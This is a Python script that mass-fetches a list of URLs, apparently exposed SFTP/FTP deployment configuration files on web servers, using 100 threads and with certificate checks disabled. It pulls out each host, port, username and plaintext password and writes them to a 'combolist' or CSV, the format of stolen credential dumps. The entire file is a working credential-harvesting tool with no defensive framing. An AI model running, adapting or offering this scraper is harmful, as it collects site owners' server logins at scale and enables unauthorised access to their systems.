import json
import urllib3
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
parser = argparse.ArgumentParser()
parser.add_argument("input_file", help="Input file containing URLs to parse")
parser.add_argument("output_file", help="Output file to save parsed information")
parser.add_argument("-f", "--file_format", default="combolist", help="Output file format (combolist or csv)")
args = parser.parse_args()

urls = []
with open(args.input_file, "r") as input_file:
    for line in input_file:
        urls.append(line.strip())

output_list = []
if args.file_format == "csv":
    output_list.append("url, name, host, protocol, port, username, remotePath, password, uploadOnSave")

def extract_info(json_response):
    try:
        json_data = json.loads(json_response)
        name = json_data.get("name", "NULL")
        host = json_data.get("host", "NULL")
        protocol = json_data.get("protocol", "NULL")
        port = json_data.get("port", "NULL")
        username = json_data.get("username", "NULL")
        remotePath = json_data.get("remotePath", "NULL")
        password = json_data.get("password", "NULL")
        uploadOnSave = json_data.get("uploadOnSave", "NULL")
        return name, host, protocol, port, username, remotePath, password, uploadOnSave
    except:
        pass

with ThreadPoolExecutor(100) as executor:
        future_to_url = {executor.submit(requests.get, url, verify=False, timeout=2): url for url in urls}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                response = future.result()
                if response.status_code != 200:
                    pass
                else:
                    print(f"[+] {url} parsed")
                json_response = response.text
                name, host, protocol, port, username, remotePath, password, uploadOnSave = extract_info(json_response)
                if args.file_format == "combolist":
                    output_list.append(f"{host}:{port} {username}:{password} {url}")
                elif args.file_format == "csv":
                    output_list.append(f"{name}, {host}, {protocol}, {port}, {username}, {remotePath}, {password}, {uploadOnSave}, {url}")
            except requests.exceptions.RequestException:
                pass
            except TypeError:
                pass
        output_list = list(set(output_list))
        with open(args.output_file, "w") as output_file:
            for item in output_list:
                output_file.write(item + "\n")
